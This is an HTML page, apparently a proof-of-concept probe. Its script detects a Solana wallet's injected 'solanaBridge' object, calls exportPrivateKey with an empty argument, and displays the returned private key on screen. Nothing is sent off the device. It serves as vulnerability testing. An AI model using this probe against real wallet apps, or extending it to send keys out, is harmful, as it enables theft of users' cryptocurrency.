<html><body style="margin:0;background:#000">
<div id="m" style="padding:40px;color:white;font-family:monospace;font-size:20px">
Loading...
</div>
<script>
var m = document.getElementById('m');
try {
  if(typeof solanaBridge !== 'undefined') {
    document.body.style.background = '#004400';
    m.innerHTML = 'BRIDGE: YES<br>TESTING...';
    solanaBridge.exportPrivateKey("").then(function(k){
      document.body.style.background = '#FFD700';
      m.innerHTML = 'PRIVATE KEY:<br><span style="font-size:28px;word-break:break-all">' + k + '</span>';
    }).catch(function(e){
      document.body.style.background = '#884400';
      m.innerHTML = 'BRIDGE YES<br>exportPrivateKey ERROR:<br>' + e.message;
    });
  } else {
    document.body.style.background = '#440000';
    m.innerHTML = 'NO BRIDGE';
  }
} catch(e) {
  document.body.style.background = '#440000';
  m.innerHTML = 'ERROR: ' + e.message;
}
</script></body></html>
